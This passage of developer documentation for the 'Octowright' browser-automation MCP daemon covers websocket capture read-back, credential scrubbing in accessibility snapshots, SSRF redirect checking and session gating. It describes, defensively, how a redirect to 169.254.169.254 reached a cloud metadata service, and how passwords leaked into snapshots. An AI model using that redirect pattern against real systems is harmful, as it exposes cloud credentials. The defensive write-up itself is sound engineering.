**Installing it.** `provide-uterm` and its sibling packages were published to PyPI on 2026-08-26, so the plugin resolves its dependencies normally and a source checkout does not need the `../provide-uterm` repo beside it, and carries no `[tool.uv.sources]` path overrides. The plugin distribution is **on PyPI** as of core 0.19.2 (2026-08-31), its first upload — `uv pip install octowright-terminal` resolves, imports, and registers its `octowright.session_kinds` entry point (verified in a clean venv). `release.yml` builds it into its own `dist-terminal/` and publishes it alongside core from the same GitHub Release, so every later release carries it. Installing from this repo (`packages/octowright-terminal`) still works and is what a source checkout does. Versions move **independently** of core's (0.1.1 against core's 0.19.4 when this was written — read the two `pyproject.toml` files for the current pairing), because locking them would force a plugin release on every core release even when nothing in it changed; the consequence is that most core releases re-present a plugin version the index already has, which is why the plugin's publish steps set `skip-existing` and core's deliberately do not — a re-upload of core means the release is wrong, not routine. The plugin needs a core carrying `octowright.plugins`, and **0.17.0 is the first release that does** — verified in the published wheel. That floor is now declared (`octowright>=0.17.0`), so an older core fails at resolve time with a readable error rather than at daemon start with `ModuleNotFoundError: No module named 'octowright.plugins'`. There the plugin lives in the `terminal` dependency group, deliberately its own rather than part of `dev`, so core installs (and every CI job but one) stay uterm-free; `make install` (`uv sync --all-groups`) or `uv sync --group terminal` brings it in, and `OCTOWRIGHT_PLUGINS=terminal` enables it. A plain `uv sync` does not merely skip the group — a sync is exact, so it **uninstalls** the plugin and its uterm tree from a checkout that had them; `make test-terminal` then refuses to run (same availability guard as CI) rather than passing over zero tests. Installing the distribution only makes the plugin *discoverable* — enabling it stays a separate, deliberate act, so a transitive dependency cannot extend a browser-driving daemon on its own.

Connector arguments (PTY/SSH/telnet), the scenario-participant `options:` shape, dashboard rendering, input redaction, what happens after a connector dies (the eviction path: identity check, teardown, the bounded ledger that lets a lookup say *why* the session is gone, and the dashboard invalidation), and the plugin's own telemetry are documented in `packages/octowright-terminal/README.md`.

### Websocket observation

Octowright has always *captured* websocket traffic -- `page.on("websocket")` is
wired at launch and every frame lands in the per-session
`.websocket.cache.jsonl` sidecar -- but nothing ever read it back, so a
real-time app (an authenticated SPA pushing updates over a socket instead of
polling) left its most interesting traffic on disk with no way to ask for it.
The alternatives were both bad: poll HTTP and lose the real-time property, or
lift the page's session token out of the browser and replay it externally,
which httpOnly cookies defeat and which the network capture correctly will not
hand over. `browser_websocket_messages` / `browser_websocket_summary` are the
read-back pair, named to match the HTTP pair.

**The capture was recording empty payloads, and had been from the start.**
playwright-python emits the payload *itself* -- a `str`, or `bytes` for a
binary opcode (`_network.WebSocket._on_frame_sent` calls
`emit(FrameSent, data)`). Only **Node's** API wraps it in an object carrying
`.payload`, and that is the shape the handler read. Since neither `str` nor
`bytes` has that attribute, it resolved to `None` for **every frame**, so the
sidecar, its `OCTOWRIGHT_WEBSOCKET_MAX_BYTES` ceiling and its batched flush
were all faithfully persisting rows with no content in them. Nothing caught it
because every existing test asserted on a row's *shape* rather than its
payload -- which is why the live test added alongside asserts on the bytes.
The attribute read is retained as a fallback so a binding that later grows a
frame object does not silently go empty the same way.

Frames are read from the sidecar rather than an in-memory ring: the sidecar is
already the full-fidelity sink, and a parallel in-memory copy would double the
footprint of a firehose page to serve a question nobody may ask. Reads go
through `recorder.tail_log_lines`, which already bounds one read by bytes,
lands the cursor on a line boundary and steps over an oversized line instead of
freezing -- all of which a socket carrying multi-megabyte frames will exercise.
A read flushes the batched write buffer first, or it would return everything
except the most recent frames, which are the ones someone watching a live
stream wants -- and the flush now restarts the batching clock as well as the
frame counter, since resetting only the counter made the next frame written see
a stale stamp and flush again immediately, undoing a batch's worth of the
syscall batching.

**Lines rather than parsed events, because `next_cursor` has to name a row.**
`tail_log` returns a window of parsed dicts and the offset of the window's END,
which is the right answer only for a caller that consumed all of it. A capped
read did not, so it handed back a cursor past every frame it had skipped: ten
frames read three at a time returned 0-2 and then nothing, and at the real
defaults (cap 100, 8 MiB window) a socket that emitted 5,000 frames returned
100 and silently lost 4,900. `recorder.tail_log_lines` yields each line with
its absolute offset, so the page can end at the first frame it did NOT return
and resume exactly there -- the rule `core_network_mixin._page_requests`
already states and the reason a *matching* row's offset is used rather than the
row after the last one returned. It splits on `b"\n"` rather than
`splitlines()`, whose extra separators would make the running offset disagree
with the bytes on disk, and it splits a **chunk at a time**: a generator over a
whole-blob split is only lazy in appearance, since the split runs in full on
the first `next()` -- measured at 5.51ms and a second copy of an 8 MiB window
for a caller that stops after 100 rows, against 0.126ms chunked, and within
noise when the whole window is consumed. `tail_log` deliberately does **not**
route through it: its three callers all discard the offsets, and pairing them
costs a generator resume, a tuple and an addition per line (+7% on an 8 MiB
window, +16% on a 1 MiB one), so it keeps one C-level split of the whole blob.
What the two share is `_read_window` -- the byte bound, the line boundary and
the oversized-line skip -- which is the part worth not duplicating.

**`truncated` covers both ways a page can be short.** It reported only the row
cap, so a caller following "keep paging while truncated" stopped holding a
prefix whenever the byte window cut the file first -- the derivation
`browser_tail_recording` already got right as `new_cursor >= total_bytes`.
Separately, `capture_truncated` reports frames dropped at CAPTURE time by
`OCTOWRIGHT_WEBSOCKET_MAX_BYTES`. The read path used to skip the recorder's
`websocket_truncated` marker as a non-frame row, so the one record that frames
were missing was invisible to the tool that exists to inspect them -- and
unlike a short page it is unrecoverable, which is why it is a separate field
rather than folded into `truncated`. The marker alone is not enough to report
it, though: it is written ONCE, at the end of the sidecar, so a page whose
window does not happen to contain it would answer `false` -- which is every
page after the one that saw it, and every caller resuming from a later cursor.
The **session** seeds the field from its own `_websocket_truncated` state, so
the answer holds on every page; the marker still stands on its own for a reader
working from the file alone.

**A row cap does not bound size.** `limit=1000` with `include_payloads=True`
against a socket carrying multi-megabyte frames put hundreds of MB on the MCP
transport in one response, the lesson `MACRO_FAILURE_CONSOLE_TEXT_CHARS`
records. A page now also ends at `WEBSOCKET_MESSAGES_MAX_RESPONSE_CHARS`
(sized above the worst-case default read, so an ordinary call never meets it),
and one frame's body is capped at `WEBSOCKET_PAYLOAD_MAX_CHARS` with
`payload_truncated` set. The budget counts **every returned string** plus a
per-row structural constant, not just the payload fields: `url` is chosen by
the page, has no length cap and repeats on every row, so counting payloads
alone let a socket with a very long URL return a thousand rows of megabytes
with the counter still under the limit -- the same oversized response, reached
through the one field nobody was watching. A base64 payload is cut on a 4-char boundary so the
prefix still decodes -- cutting anywhere else hands back a string that raises
on `b64decode`, which reads as a corrupt capture rather than as truncation. The
budget deliberately still returns the FIRST frame even when it alone exceeds
it, or a caller would page forever on a frame that can never fit.

**Neither read tool takes the session operation gate.** One reads a file and
the other reads a dict; no Playwright call is involved. Taking the per-session
FIFO lease queued a poll behind whatever browser work was running -- the whole
of a `macro_run_sequence`, up to the 300s queue timeout -- which is precisely
the "follow a live stream" workflow they exist for. `browser_tail_recording`,
the closest analogue and also a pure tail read, resolves its session the same
way. `cursor` is clamped at both the tool and in `tail_log_lines`: it arrives
as an LLM-supplied int, and a negative one reaches `fh.seek` and comes back as
a bare `OSError: [Errno 22]`.

**The recorded preview is short; the sidecar's is not.** Fixing the payload
read gave that field content for the first time, and it is written to the MAIN
session JSONL as well as the sidecar -- a file with no ceiling on by default
(`OCTOWRIGHT_RECORDING_MAX_BYTES`) that `browser_tail_recording`, the dashboard
event stream and `capture_create(kind="recording")` all read on behalf of
callers who never asked about websockets. The main recording gets
`WEBSOCKET_RECORD_PREVIEW_CHARS`; the sidecar keeps the long preview, since
that is what the read tools serve from. `payload_size` is the frame's real
length in both, so capping the text costs a reader nothing it needed.

**Payloads are previews by default**, with `include_payloads=True` for the full
body, mirroring `include_headers` on the HTTP pair and for the same reason: a
busy socket emits thousands of frames. Text and binary stay separate keys
(`payload_text` / `payload_b64`) so a caller decoding base64 never has to guess
which it is holding. Honest scope on redaction: a frame is application data
with no name to classify on, so unlike a header there is nothing to key a
policy off -- previews are length-capped at capture time and full payloads are
opt-in, which bounds volume rather than sensitivity.

`browser_websocket_summary` answers "what is connected right now". The recorder
already wrote open/close *events*, but deriving live sockets from them meant
replaying the JSONL, so a one-line question required reading a log. The
registry is bounded (`WEBSOCKET_REGISTRY_MAX`) because a page can open a socket
per retry indefinitely; eviction takes **closed sockets first**, since evicting
a live one to retain a finished one answers the question wrong, and the
discarded count is reported so a shrinking total is explainable. It returns
**copies** of the registry entries: `list(registry.values())` copies the list
and not the dicts inside it, which the frame handler keeps mutating -- the same
defect, fixed the same way, as `_select_console_tail`.

**The registry key is a session-issued id, never an object address.** With no
`.id` on playwright-python's `WebSocket`, the fallback was `id(websocket)` --
and CPython reissues an address once the object is freed, so a page opening a
socket per retry could hand a NEW socket the key of a finished one, overwriting
its record and merging two sockets' frames into one stream under a single
`socket_id`. A per-session counter cannot collide however churny the page is. A
binding-supplied `.id` is deliberately **not** used as the key either: nothing
guarantees it is unique within the session and `_register_websocket`
overwrites on a repeat, so believing a binding that handed out a duplicate (or
the literal `ws-1`) would reopen the very merging bug the counter closes. It is
kept beside the key as `binding_id`, where it can be correlated without
deciding identity. `browser_websocket_messages`
also stringifies `socket_id` to match the summary's `id`, which
`_register_websocket` has always coerced -- returning the raw recorded value
left a caller joining the two by dict key or `==` matching nothing.

**A socket is registered only once its listeners attach.** Registering first
left a socket whose wiring failed (or that had no `.on` at all) in the table
with no `close` handler to ever set `closed_at` -- permanently "open", and
since eviction prefers closed entries, evicted LAST, so a page that tripped
this repeatedly pushed out genuinely live sockets: the exact outcome the
eviction ordering exists to prevent.

### Accessibility-snapshot credential scrubbing

Playwright renders a text-ish control's **value** as its accessible name, and the accessibility tree has no notion of `type=password` — a filled password box comes back as `- textbox: hunter2`, byte-identical in shape to a username box. Verified against real Chromium. Every aria sink therefore emitted cleartext credentials: `browser_snapshot`, `browser_brief` (in the **core** profile), `capture_create`, `golden_save` (which persists them to disk indefinitely), `browser_capture_and_close`, the dashboard session detail, and `_resolve_semantic_metadata` — whose parsed `role` lands in the **JSONL recording** on every click, bypassing `OCTOWRIGHT_REDACT_INPUTS` in its default configuration.

`OCTOWRIGHT_REDACT_INPUTS` did not cover any of it: it classifies a *typed value* at the moment of `fill`/`type` by inspecting the target element, and an aria snapshot is neither. Both paths now read one policy resolver, so `passwords` (the default) means the same thing on both.

Every sink routes through `session/aria_redaction.aria_snapshot(locator)`; a test (`tests/aria_redaction/test_no_unscrubbed_sinks.py`) AST-scans `src/` and fails on any raw `locator.aria_snapshot()` call outside the scrubber, because the leak was not one bug in one place and an eighth sink would reintroduce it. Design notes worth keeping:

- **Values are collected before the snapshot is taken.** If classification fails the call raises `AriaRedactionError` and no snapshot happens — there is no path that yields an unscrubbed tree because the classifier was unavailable. (Test doubles must therefore model the scan; `tests/_aria_stubs.py` provides it. `first.evaluate` serves both this scan and the record-time password probe, so the stub dispatches on the production JS constant by identity.)
- **Matching is value-based, not node-based.** The tree is a rendered string by then, so the only reliable join back to "which name was a secret" is the value, read from the DOM.
- Playwright **normalizes** an accessible name (a newline inside a value renders as a space), so each value is scrubbed in both raw and whitespace-collapsed form. It does *not* escape quotes/backslashes, so no unescaping is needed.
- Replacement is plain substring, **longest value first**, so a short secret can't eat a longer one it is a substring of. A 2-char password will also blank unrelated occurrences — the safe direction to be wrong in.
- Only light-DOM form controls are read; a value inside a **closed shadow root** is not reachable and is not scrubbed.
- `_parse_semantic_line` now handles both accessible-name renderings (`button "Confirm Order"` **and** `textbox: tanuki-tim`); only the first was handled, which is why the whole `role: value` string ended up in `role`.

### Per-hop redirect checking

`ssrf.check_navigation_url` runs pre-flight, on the URL a tool or macro asked for. A redirect is not that URL: a public page answering `302 Location: http://169.254.169.254/…` reached the metadata service with the guard none the wiser, and the read tools returned its body. Verified end-to-end against real Chromium.

**The obvious implementation does not work.** Playwright does not re-invoke a route handler for a redirected request — measured both after `route.fallback()` *and* after `route.fulfill(response=<the 302>)`: Chromium follows the chain inside the network stack, the handler runs exactly once (first hop), and the server sees every hop. A handler that inspects `request.url` is a no-op on precisely the case it exists for.

`ssrf_guard.install_navigation_guard` instead walks the chain itself for a GET navigation using `route.fetch(max_redirects=0)`, validating each `Location` **before** the request that would fetch it, then hands the navigation back to the browser with `route.fallback()` once the chain is clear. Accepted costs, all confined to deployments that opted into a policy (nothing is registered when `OCTOWRIGHT_SSRF_POLICY` is `off`, the default):

- **An allowed GET navigation is fetched twice** — once to validate, once by the browser. Letting the browser navigate for real is what keeps `page.url`, redirect history, and relative-URL resolution correct; fulfilling the final body against the original URL would silently break `browser_expect_url` and every relative link.
- **Non-GET navigations are not chain-checked** — validating a POST would double-submit the form. They keep the pre-flight check only, and the skip is logged.
- **Subresources are not checked** — a fetch to a private host can't be read back through the tool surface, and intercepting every image/XHR would break ordinary pages for no gain in this threat model.

Chain length is bounded by `MAX_REDIRECT_HOPS` (20, matching browsers) so a redirect loop can't spin the validator.

### Capability Profiles

The full MCP tool surface is 133 tools on a core install (140 with the `terminal` session-kind plugin enabled via `OCTOWRIGHT_PLUGINS=terminal`, which adds the 7 `terminal_*` tools). When the LLM only needs a subset, set `OCTOWRIGHT_PROFILE` (or pass `--profile=...` to `octowright serve`) to one or more comma-separated profile names from `src/octowright/server/profiles.py`. Tools not listed in any active profile are skipped at `@mcp.tool` decoration time, so the LLM-visible schema shrinks accordingly. Profile names available today: `core` (minimal browser-driving plus compact DOM/HTTP discovery surface), `advanced` (inspection + cached captures + summaries + assertions + viewport controls + ARIA-locator interactions), `macros`, `scenarios`, `goldens` (accessibility-tree snapshot save/diff/verify), `personas`, and `terminals` (declared by the terminal plugin itself — a profile a plugin brings, not a core-defined one — and only present when that plugin is enabled). Unset / `all` keeps every tool (the default). The named profiles together cover the profile-scoped tools plus 7 always-on meta/Advisor tools — the remaining tools (a handful of less-common views, mutation helpers, trace/open-tab utilities, etc.) only register when no filter is set, so `--profile=core,advanced,macros,scenarios,goldens,personas,terminals` is **not** equivalent to no filter. Authoritative tool counts live in `src/octowright/server/profiles.py`.

**Always-on meta and Advisor tools.** Seven diagnostic/guidance tools are exempt from the profile filter and register under any profile (or no profile): `octowright_status`, `octowright_storage_report`, `octowright_dashboard_url`, `octowright_check_takeover`, `octowright_advisor_status`, `octowright_advisor_set_preference`, and `octowright_advisor_record_macro_observation`. These give the LLM a way to inspect the active profile, inspect storage paths, find the dashboard URL, detect competing MCP plugins, and surface local Advisor guidance regardless of filter. The list is `ALWAYS_ON_TOOLS` in `src/octowright/server/profiles.py`.

### Protected close behavior

`protected=True` marks a browser as user-owned. Close-capable tools must refuse protected browsers unless the caller explicitly passes `force=True`. This applies to `browser_close`, `browser_close_all`, and `browser_capture_and_close`; the capture-and-close tool checks protection before taking screenshots or snapshots so a refused call has no capture side effects. Internal rollback/teardown paths that are recovering from errors use `force=True` intentionally.

Headed (user-facing) browsers are `protected` **by default** so an agent's
reflex `browser_close` can't destroy a window the user is watching: when a
launch doesn't pass `protected` explicitly, a resolved-headed, non-ephemeral
browser gets `protected=True` (reason `headed_default`), while headless
(CI/agent-internal) browsers stay closeable. Precedence: explicit `protected`
arg > `OCTOWRIGHT_PROTECT_BROWSERS=1` (all) > `OCTOWRIGHT_PROTECT_HEADED`
(headed, default on) > unprotected. The refusal message is tailored by
`session.protected_reason`. Ephemeral headed browsers stay closeable
(throwaway intent). Internal relaunch/handoff/teardown close with `force=True`
and are unaffected.

### Typing into a canvas: `key_mode="keys"`

`browser_type` sends Playwright's `page.type()`, which dispatches `keydown`
carrying the right `key`/`text` payload but **never holds the Shift modifier
down**. A DOM `<input>` reads that payload, which is why this is invisible on
ordinary forms and why it survived this long. A canvas-based app — a KVM/BMC
console (AMI H5Viewer), a canvas terminal, anything drawing its own text
instead of using a real input — reads `code` + `shiftKey` and converts that to
HID scancodes. It never sees the payload, so Shift is silently dropped and
every shifted character lands as its unshifted twin. Measured against a real
H5Viewer on 2026-08-19: `echo TYPE=Ab*:` arrived as `echo type=ab8;` —
`T`→`t`, `A`→`a`, `*`→`8`, `:`→`;`, with no error and no warning. On a BMC
console that is dangerous rather than merely wrong: a path silently losing its
`*` changes the command's scope.

`key_mode="keys"` presses physical keys with Shift genuinely held
(`_type_as_keystrokes`), so `shiftKey` is actually set. Three things about it
are load-bearing:

- **It is opt-in, not the default, and not auto-detected.** A character's
  physical key is a property of the *keyboard layout*, not of the character —
  `*` is Shift+Digit8 on US QWERTY and elsewhere on AZERTY — and nothing on
  the wire says which layout the target believes it has. `session/keyboard_layout`
  is therefore US QWERTY, the same assumption Playwright's own `code`
  generation makes. Defaulting to it would trade a silent failure on canvas
  targets for a silent failure on non-US ones. Sniffing for a `<canvas>`
  element was considered and rejected for the same reason it would read as a
  guarantee: a target rendering its own text need not be a canvas (a `div`
  with a keydown handler behaves identically), so the detection would be
  right often enough to be trusted and wrong often enough to hurt. The tool
  description names the failure mode instead, which is what the LLM actually
  reads.
- **Keystrokes go through `session.page.keyboard`, element lookup through
  `session._target()`.** `Frame` has no `.keyboard` — only `Page` does — so a
  frame-scoped selector still resolves in its own frame while the keys go to
  the page. `browser_a11y_dragdrop` splits the two the same way.
- **Shift is released in a `finally`.** A latched modifier corrupts every
  later keystroke on that page, including another tool's, so a raising press
  must not leave it down.

A character with no key on the layout (accented, emoji, any non-ASCII) falls
back to Playwright's own text insertion: it has no scancode to send, and a
guessed key would be worse than the payload. `key_mode` is recorded **only
when set**, so an ordinary `type` row stays byte-identical to every
pre-existing recording, and replay reproduces keystroke mode rather than
silently corrupting input the recorded run got right. The macro linter derives
its allowed fields from the method signature, so it needed no change.

### Keyboard (WAI-ARIA) drag-and-drop

`browser_drag` drives Playwright's `drag_and_drop`, a synthetic mouse sequence. It cannot operate a widget that implements only the **keyboard** WAI-ARIA APG pattern — grab with a key, move with keys, drop with a key — which is what accessible drag-and-drop widgets usually implement. `browser_a11y_dragdrop` is that counterpart.

One atomic attempt per call: grab → navigate → drop → poll-verify → release-on-failure. It deliberately does **not** retry or switch navigation strategy; that stays in the caller's orchestration, the same boundary `browser_click` draws by not retrying against alternate selectors.

**Exactly one `verify_*` field is required.** There is no universal cross-widget "it worked" signal, so a heuristic that sometimes works would be worse than an explicit contract: with no check the call would report success having confirmed nothing. Verification **polls** (`verify_timeout_ms` / `verify_poll_ms`) rather than checking once, because most drag flakiness is post-drop animation and reflow settling.

It **returns** its result on an ordinary failed verify instead of raising — a deliberate deviation from `expect_*`, which raises to abort a script when a precondition fails. This tool exists so the caller can decide what a failed drop means, and raising would force every caller into `try/except` just to read `stage_reached` (`failed_grab` | `navigated` | `dropped` | `verified` | `failed_verify`). It raises only when the result would be meaningless: the selector matches nothing, or the frame detached.

The release-on-failure path is the whole point rather than a nicety. A grab that succeeded with a drop that did not leaves the widget stuck in grab mode, which is **indistinguishable from a grab that never registered** — the exact failure this generalizes from a hand-rolled implementation in a real test harness. So a failed verify presses `release_key`, and so does any `Exception` raised after a successful grab, including one thrown by the caller-supplied `grabbed_predicate_js`. The one carve-out is a grab predicate that returns **False**: the key was pressed but the widget demonstrably never entered grab mode, so there is nothing to release.

**Task cancellation is the honest exception, and it does not release.** The engine catches `Exception`, and `asyncio.CancelledError` is a `BaseException` — so a cancel landing on the `await asyncio.sleep(...)` inside the verify poll, after a successful grab, unwinds without pressing `release_key` and leaves the widget grabbed. Making cancellation release would mean spawning a shielded task from inside the operation lease, which is exactly what the module's own docstring argues against (a spawned task is a different identity to `gated_operation` and would queue behind the lease its own parent still holds). A cancelled drag therefore needs a page reload, or an explicit `browser_press_key` of the release key, before the widget is usable again.

Two implementation constraints worth knowing before editing it. Keystrokes go through `session.page.keyboard`, not the active target: **`Frame` has no `.keyboard`** (measured; `Page` does), so a frame-scoped call would crash on the first press — element lookup still goes through `session._target()` so frame-scoped selectors resolve in their own frame. And the verify loop polls **in the calling task**: `gated_operation` re-enters only for the owning task, so a spawned helper calling back into a gated session method would queue behind the lease its own parent still holds and deadlock until the queue timeout.

### Browser Session Operation Gate

Every `BrowserSession` owns one `SessionOperationGate` (`src/octowright/session/operation/gate/core.py`) that serializes Octowright-owned Playwright work FIFO within that session while leaving different sessions fully parallel: the exact owning `asyncio.Task` may re-enter (a compound operation calling existing session helpers doesn't deadlock), but a task the owner spawns is a different identity and queues behind it like anyone else. One macro run — including nested `macro_call` actions, a full `macro_run_sequence`, macro-artifact replay, capture-and-close, and a closing handoff/fluid relaunch of the source session — holds one root lease for its entire invocation so a manual action can't interleave mid-sequence. Ordinary admission is bounded by `OCTOWRIGHT_OPERATION_QUEUE_TIMEOUT_SECONDS` (default `300`, must be positive finite seconds; `BrowserPool(operation_queue_timeout_seconds=...)` takes precedence over the env var) — this is queue wait only, separate from and added on top of any Playwright action/navigation/expect timeout, and the gate never retries a browser operation. A configuration at or above the 600-second progress-heartbeat ceiling (`OCTOWRIGHT_HEARTBEAT_MAX_SECONDS`) is allowed but logs `octowright.pool.operation_queue_timeout_exceeds_heartbeat_ceiling` because a caller stuck that long in queue may lose bridge transport visibility before it is ever admitted. A normal close establishes a cutoff, drains everything already admitted or queued, and only then tears the session down; work arriving after the cutoff is rejected with `SessionClosingError` rather than queued, and the close outcome is durable — cancelling the calling task does not revoke an accepted close or strand the session. External browser/page/context closure (not routed through the gate) can still interrupt whatever operation is actively running; any operation still queued at that point fails with `SessionClosedError`. All gate error kinds (`SessionBusyTimeoutError`, `SessionClosingError`, `SessionClosedError` — plus its `SessionCloseAbortedError` subclass — `OperationGateInvariantError`, and `SessionOperationAbortedError`, both described below) are session/tool-scoped — they never mean the MCP transport should be restarted, and a broken gate is isolated to its one session. `BrowserSession.list_pages()`, `list_frames()`, and `set_dialog_policy()` are now `async` (they read/mutate active-target state under the gate) — any embedder calling them directly must `await` them, and should tear a session down through `BrowserPool.close()` rather than raw Playwright teardown so the close cutoff/drain semantics apply. `session.operation_snapshot()` / the optional field `BrowserPool.list_sessions()` adds returns only `{state, active_operation, active_for_ms, queue_depth, oldest_wait_ms, queue_timeout_seconds}` — fixed operation identifiers and timing/depth counters, never a selector, URL, credential, macro argument, or task identity. The same snapshots for every live browser session are also available in one call at `octowright_status()["pool"]["operation_gates"]` (each entry adds `instance_id` and `kind`), the fastest way for an agent or operator to check whether a specific session's gate is stuck. `OperationGateInvariantError` (the fourth gate error) means that one session's gate reached an inconsistent internal state and is now permanently `broken` — it is not a transport or daemon problem; relaunch that one session and move on. An **active-duration ceiling** is a separate, OFF-by-default backstop that reaches the same `broken` outcome from a different direction: `OCTOWRIGHT_OPERATION_ACTIVE_TIMEOUT_SECONDS` (unset, or a falsey token, disables it) covers the Playwright call site nobody has bounded with `session/timeouts.bounded` yet, rather than the ones Task 1 already enumerated. Instead of a per-gate timer, the periodic housekeeping loop (job 6 — see `housekeeping.py`'s module docstring) checks each live session's gate once per cycle against what it already tracks — `_active_since`/`_root_operation` — via `SessionOperationGate.enforce_active_timeout`; a breach cancels the owning task and drives that ONE session's gate to `broken` through the same `_break_locked` invariant path every other break uses, so a LATER operation is rejected with the ordinary `OperationGateInvariantError` message. The one caller actually cancelled is a separate case, and gets `SessionOperationAbortedError` (a `RuntimeError`) rather than a bare `asyncio.CancelledError`: that owning task is typically the MCP request task, `CancelledError` is a `BaseException` the mcp library does not convert, and the JSON-RPC dispatcher answers `CONNECTION_CLOSED` — which would kill the whole connection including concurrent healthy calls, and tell the agent the daemon is dead. `operation()` therefore absorbs the ceiling's OWN cancellation, distinguishing it from a genuine one (client disconnect, daemon shutdown, which still propagate as cancellation) by `uncancel()`-ing back to the cancelling count captured when the task took ownership — `asyncio.timeout.__aexit__`'s own pattern. The absorption covers the `finally`'s release as well as the body: a `finally` is a SIBLING of the `except` clause rather than nested in it, so a breach landing in the one-scheduler-iteration window between "body returned" and "release completed" escaped unabsorbed with the full original blast radius until that path was wrapped too. Checking is per-session and isolated, so one wedged session's breach can never touch another session's gate in the same cycle. The check acts on `OPEN` **and** `CLOSING` (never `CLOSED`/`BROKEN`, which have no active lease left to break): `reserve_close` queues a close reservation's waiter behind whatever owner already holds the gate rather than granting it, so checking `OPEN` only would disarm the ceiling the instant a close was requested — exactly when a human or agent reaches for it — and leave `reservation.wait()` hanging forever. Breaking while `CLOSING` still resolves the close instead of stranding it (`_fail_queued_locked` fails the queued waiter, and the close coordinator's own `finally` still drains `_sessions`/`_closing_sessions` regardless of whether the close body itself ever ran) — verified end to end, not merely assumed, by `tests/test_operation_gate_integration.py::test_active_timeout_ceiling_unwedges_a_close_in_progress`. A ceiling breach that instead cancels a close reservation already GRANTED and mid-teardown (e.g. a hung `context.close()`) does not resolve through `_break_locked` at all: such a cancellation can land in more than one place — swallowed and returned by `close_helpers.prepare_then_teardown`, or raised in the close body before it ever runs — and every one is normalized in a SINGLE seam, `_terminal_close_failure` (`operation/gate/close.py`), into `SessionCloseAbortedError`, a `SessionClosedError` subclass (`operation/gate/types.py`). `_release_close` deliberately converts nothing itself, so one cause cannot yield two error types depending on where it landed. That subclass distinguishes "teardown was aborted, the browser's close state is unconfirmed" from a plain `SessionClosedError` (an external close winning the race BEFORE any teardown ran, browser confirmed torn down either way). `relaunch._close_with_fallback_snapshot` relies on that distinction to refuse treating an aborted close as its ordinary safe-race fallback -- letting it propagate instead of silently discarding a preparation snapshot for a stale pre-close read and launching a replacement over an unconfirmed teardown (Chrome's `SingletonLock` on a persistent profile) -- verified end to end by `tests/test_handoff.py::test_handoff_close_aborted_by_ceiling_propagates_instead_of_stale_snapshot`. This is deliberately a DIFFERENT signal from a per-call `SessionCallTimeoutError` escaping a gated operation (the `on_call_timeout` hook described above): cancelling from the outside delivers a plain `asyncio.CancelledError` with no `__cause__` chain back to a `SessionCallTimeoutError`, so `on_call_timeout` does not fire for a ceiling breach PROVIDED the gated code under the cancelled task does not itself convert that `CancelledError` into a different exception type — true of every call site checked today, though not a language-level guarantee — so in practice one wedge produces exactly one signal, not both an `unresponsive` `SessionCrashedEvent` and a contradicting ceiling-broken gate. Telemetry is the same shape: six bounded metrics, all under `octowright_operation_*`, with attributes limited to the fixed operation name, browser `kind`, and outcome/reason — never an instance ID — `octowright_operation_queue_wait_seconds` and `octowright_operation_active_duration_seconds` (histograms), `octowright_operation_queue_timeout_total`, `octowright_operation_active_timeout_total`, and `octowright_operation_rejected_total` (counters), and `octowright_operation_queue_depth` (a gauge aggregated per browser `kind`, not per session or operation). Gate scheduling itself is never written to JSONL, replayed, exported, or otherwise surfaced through the macro pipeline — only the underlying behavioral action is. Accessible keyboard drag/drop (`browser_a11y_dragdrop` / `session.a11y_dragdrop`, gated like any other session operation and replayable as the `a11y_dragdrop` macro action) is built. A future control-lease/"Take control" workflow, terminal-session gating, and the repo-wide DRY audit remain explicitly out of scope for this gate and are separate future work.

### Per-engine launch health

`BrowserPool` tracks the last launch outcome for each engine kind (`chromium`/`firefox`/`webkit`) and surfaces it at `octowright_status()["pool"]["engine_health"]`, e.g. `{"chromium": {"outcome": "ok", "at": "2026-08-29T12:00:00.000Z"}, "webkit": {"outcome": "error", "at": "...", "error": "TimeoutError"}}`. A fourth key, `unknown`, can appear: `kind` reaches `BrowserPool.launch` straight from the caller and is validated only deeper, so a launch that fails validation is recorded under `unknown` rather than under the raw string. That keeps both this block and the `kind` metric label bounded to four values instead of growing one permanent entry — and one permanent metrics time series — per distinct string a caller passes. It is not a fourth engine. This exists because a real incident's diagnosis spent about an hour of a 12.6-hour wedge establishing one fact — "WebKit is broken on this machine, Chromium is fine" — even though the pool already saw every launch and every failure per engine; it just never said so. Each kind is tracked independently (`BrowserPool._record_engine_health`, called from `BrowserPool.launch` after `_launch_with_driver_retry` resolves), so one engine failing does not touch another's last-known state. A kind never launched is **absent** from the block rather than reported healthy — "no data" and "fine" are different answers, and conflating them is what made the original diagnosis slow. On failure, `error` carries the exception's **class name only, never its message** — a launch failure message can carry a filesystem path or a profile name, while the class name is the diagnostic signal and carries nothing sensitive (the same reasoning `octowright_browser_launch_failed_total` uses for its `error` label).

### Octowright Advisor

Octowright Advisor is local and deterministic. It records bounded MCP tool-usage summaries and explicit repeated-workflow observations, then returns suggestions in `octowright_status` and `octowright_advisor_status`. Agents should inspect the `advisor` block after first-touch status. When an agent notices the same manual workflow repeating, call `octowright_advisor_record_macro_observation(source="llm", signature=..., summary=...)`; two matching signatures produce a `macro_candidate` suggestion. Advisor never auto-saves macros — macro candidates remain prompt-only even when the preference is `automatic`. Use `octowright_advisor_set_preference` to persist `yes` / `no` / `automatic` preferences for `macro_candidate` and `profile_change`.

### Post-upgrade "what's new" notice

The first time a leader starts on a new version (the running version differs from the last-seen marker), `octowright.upgrade` records a one-time notice and the leader echoes a banner to stderr (a human terminal in `--no-singleton`/inline mode; the daemon log otherwise). The notice is also surfaced at `octowright_status()["upgrade"]` — `{kind, previous_version, current_version, highlights}`, or `null` when nothing changed — so the agent should, on first-touch status, present the `highlights` to the user as a "what's new" banner. It fires once per version bump (the leader marks the new version seen). Curated highlights live in `octowright.upgrade.HIGHLIGHTS` keyed by version (updated at release time; a CI guard test fails if the current `VERSION` has no entry). The last-seen marker path is `OCTOWRIGHT_UPGRADE_STATE`.

## Env Var Configuration

All defaults are in `src/octowright/defaults.py`. Key vars:
- `OCTOWRIGHT_HTTP_PORT` — HTTP dashboard port (default 6286, auto-bumps if busy)
- `OCTOWRIGHT_HTTP_HOST` — HTTP dashboard bind host (default 127.0.0.1)
- `OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD` — set to `1` to allow non-loopback access to sensitive dashboard/MCP endpoints. **Warning:** there is no auth layer; combining a non-loopback `OCTOWRIGHT_HTTP_HOST` with this flag exposes RCE-equivalent surface (the MCP transport drives browsers) to the network. Use only behind your own auth gateway.
- `OCTOWRIGHT_DEFAULT_URL` — override the URL opened on `browser_launch` with no `url` argument (default resolves from the bound port at runtime; always points at `/new-tab` on the local daemon)
